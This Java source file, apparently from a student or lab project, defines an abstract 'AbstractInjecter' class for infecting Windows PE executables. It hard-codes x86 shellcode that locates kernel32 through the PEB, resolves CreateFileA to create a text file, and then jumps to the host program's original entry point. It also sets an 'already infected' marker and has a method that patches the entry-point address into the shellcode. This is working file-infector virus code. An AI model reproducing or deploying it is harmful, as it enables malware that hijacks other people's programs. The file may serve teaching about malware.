/*
 * @Descripttion: your project
 * @version: 1.0
 * @Author: Yhank
 * @Date: 2021-10-25 17:06:37
 * @LastEditors: Yhank
 * @LastEditTime: 2021-10-30 17:32:30
 */
package InjectModule;

import UseFunction.UF;
import java.util.Arrays;

public abstract class AbstractInjecter {
    static final int[] sourceShellCode = new int[]
                                {
                                0x33, 0xC9, 0x64, 0x8B, 0x41, 0x30, 0x8B, 0x40, 0x0C, 0x8B, 
                                0x70, 0x14, 0xAD, 0x96, 0xAD, 0x8B, 0x58, 0x10, 0x8B, 0x53, 
                                0x3C, 0x03, 0xD3, 0x8B, 0x52, 0x78, 0x03, 0xD3, 0x8B, 0x72, 
                                0x20, 0x03, 0xF3, 0x33, 0xC9, 0x41, 0xAD, 0x03, 0xC3, 0x81, 
                                0x38, 0x43, 0x72, 0x65, 0x61, 0x75, 0xF4, 0x81, 0x78, 0x04, 
                                0x74, 0x65, 0x46, 0x69, 0x75, 0xEB, 0x81, 0x78, 0x08, 0x6C, 
                                0x65, 0x41, 0x00, 0x75, 0xE2, 0x8B, 0x72, 0x24, 0x03, 0xF3, 
                                0x66, 0x8B, 0x0C, 0x4E, 0x66, 0x49, 0x8B, 0x72, 0x1C, 0x03, 
                                0xF3, 0x8B, 0x14, 0x8E, 0x03, 0xD3, 0x33, 0xC9, 0x81, 0xC1, 
                                0x74, 0x78, 0x74, 0x00, 0x51, 0x68, 0x69, 0x61, 0x6E, 0x2E, 
                                0x68, 0x57, 0x65, 0x69, 0x74, 0x68, 0x32, 0x2D, 0x4C, 0x69, 
                                0x68, 0x38, 0x30, 0x31, 0x32, 0x68, 0x33, 0x30, 0x32, 0x31, 
                                0x68, 0x32, 0x30, 0x31, 0x39, 0x33, 0xC9, 0x51, 0x51, 0x68, 
                                0x80, 0x00, 0x00, 0x00, 0x83, 0xC1, 0x02, 0x51, 0x33, 0xC9, 
                                0x51, 0x51, 0x68, 0x00, 0x00, 0x00, 0x40, 0x8B, 0xCC, 0x83, 
                                0xC1, 0x1C, 0x51, 0xFF, 0xD2, 0x83, 0xC4, 0x20, 0x33, 0xC9, 
                                0x64, 0x8B, 0x41, 0x30, 0x8B, 0x40, 0x0C, 0x8B, 0x70, 0x14, 
                                0x8B, 0x46, 0x10, 0x05, 0xFF, 0xAA, 0x88, 0xAA, 0xFF, 0xE0
                            };
    static public byte[] isInfectedSignture = { (byte) 0xFF, (byte) 0xF7, (byte) 0x8F, (byte) 0xFF }; // 已经被感染的标记
    int[] shellCode = null;

    UF uf = new UF();
    String filePath = null; 

    long aOEPRawStore = -1;
    long addressOfEntryPointRVA = -1;

    public AbstractInjecter(String filePath, long aOEPRawStore, long addressOfEntryPointRVA) {
        this.filePath = filePath; 
        this.aOEPRawStore = aOEPRawStore;
        this.addressOfEntryPointRVA = addressOfEntryPointRVA;
        shellCode = getShellCode();         // 根据输入得到特化的shellCode
    }

    abstract public int inject();
    
    int[] getShellCode() {
        // 修改shellCode，将预留位变成原程序的aOEPR
        int injectLen = sourceShellCode.length;
        byte[] sourceAOE = uf.back4Byte(addressOfEntryPointRVA);
        int[] shellCode = Arrays.copyOf(sourceShellCode, sourceShellCode.length);
        shellCode[injectLen - 6] = sourceAOE[0] & 0xFF;
        shellCode[injectLen - 5] = sourceAOE[1] & 0xFF;
        shellCode[injectLen - 4] = sourceAOE[2] & 0xFF;
        shellCode[injectLen - 3] = sourceAOE[3] & 0xFF;
        return shellCode;
    }

    public static int getShellCodeLength() {
        return sourceShellCode.length;
    }

}
/*
 * @descripttion: your project
 * @version: 1.0
 * @author: yhank
 * @date: 2021-10-25 17:06:37
 * @lasteditors: yhank
 * @lastedittime: 2021-10-25 17:06:38
 */
